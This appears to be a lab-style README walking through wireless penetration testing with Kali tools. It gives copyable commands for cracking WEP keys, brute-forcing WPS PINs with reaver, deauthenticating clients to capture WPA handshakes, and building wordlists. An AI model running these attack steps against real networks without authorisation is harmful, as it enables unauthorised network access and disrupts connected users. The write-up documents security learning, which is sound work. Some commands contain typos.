# Wireless Network Penetration Testing

## Objective

Finding weaknesses in Wifi networks with different encryption types. Finding the weakness of WEP networks. 


### Skills Learned

- Finding 5Gz and 2.5Gz wireless networks around me
- aircrack-ng
  

### Tools Used

- Kali Linux.
- VMware Fusion.
- airodump-ng
- aircrack-ng
- WASH
- aireplay-ng
- Crunch

### Steps for WAP

- Changing the wireless USB mode to monitoring
```bash
ifconfig wlan0 down
iwconfig wlan0 mode monitor
ifconfig wlan0 up
```

>The mode will be Monitor now

1. Sniffing on 5G and 2.4G networks and find the network with the cipher WEP
```bash
airdump-ng --band abg wlan0
```

2. Sniffing packets from the network with the WEP cipher with the specific MAC and channel number and save the results in a file test
```bash
airodump-ng --bssid 03:DE:4B:AD:CC:8B --channel 9 --write test mon0
```

3. Wait for the #Data number to move real fast and open a new terminal window and ls to find the ".cap" file that you created.
4. Use aircrack-ng to find the Key from the file we created ending with .cap
```bash
aircrack-ng test.cap
```
5. Copy the key and remove the : and that would be the wifi password.

**If the network is not busy we need to follow the steps below: -**

1. We need to capture data from the WEP network and write it in a file.
```bash
 airodump-ng --bssid B4:75:0E:36:6A:9E --channel 11 --write basic_wep wlan0
```
2. We will need to commmunicate with the WEP network by creating a Fake Authentication attack using aireplay-ng
```bash
aireplay-ng --fakeauth 0 -a B4:75:0E:36:6A:9E -h 6E:3D:AC:84:DB:A0 wlan0
```
>the first MAC is the target and the second MAC is the USB adapter.
>If you want to know the permanent MAC address of the USB adapter
```bash
macchanger -s wlan0
Current MAC:   ba:1f:40:bc:19:d4 (unknown)
Permanent MAC: 34:7d:e4:40:83:86 (unknown)
```
3. We need to create an ARP Request preplay attack to generate new packets
```bash
aireplay-ng --arpreplay -b B4:75:0E:36:6A:9E -h ba:1f:40:bc:19:d4 wlan0
```
4. We will then crack the file we created to find the password.
```bash
aircrack-ng arpreplay-01.cap
```

### Steps for WPA/WPA2

**Works for some routers with WPS**
- Changing the wireless USB mode to monitoring
```bash
ifconfig wlan0 down
iwconfig wlan0 mode monitor
ifconfig wlan0 up
```
- Find wifi networks with WPS enebled using the tool WASH
```bash
wash --interface wlan0
```
- Use aireplay-ng to create a fake authentication with te first MAC address is the target and the second is the USB wireless adapter MAC address, which is the first 12 characters from the ifconfig, make sure to replace the "-" with the ":".
```bash
aireplay-ng --fakeauth 30 -a 78:67:0E:31:4C:42 -h 3A:97:5F:E2:18:5F wlan0
```
- Don't execute the code above yet. We go to the second terminal and use reaver tool to bruteforce and get the pin.
```bash
reaver --bssid 78:67:0E:31:4C:42 --channel 1 --interface wlan0 -vvv --no-associate
```

- If Reaver finds the pin then the password will be available for the Wifi network. 
>Not all routers will be cracked with these steps.

**Method for capturing handshake**

1. Sniff on 5G and 2.4G networks and find the network with WPA/WPA2 and get the BSSID
```bash
airdump-ng --band abg wlan0
```
2. Write a file via **airodump-ng**.
```bash
airodump-ng --bssid 30:DE:4B:AD:CC:8A --channel 161 --write wpa_handshake wlan0 
```
3. Disconnect the client from the target network to capture the handshake.
```bash
aireplay-ng --deauth 4 -a 30:DE:4B:AD:CC:8A -c EE:7B:BE:70:D6:1F wlan0
```
> The number after the --deauth is the number of packets you want to send to the target.
> The first MAC is the target and the second MAC of the client you want to disconnect (will be under station).

4. The handshake WPA will be saved in the file we created wpa_handshake.cap
5. We will create a wordlist of passwords possibilities using the tool **Crunch**. Then read the file
```bash
crunch 1 3 abc123 -o test_wordlist.txt
cat test_worklist.txt
```
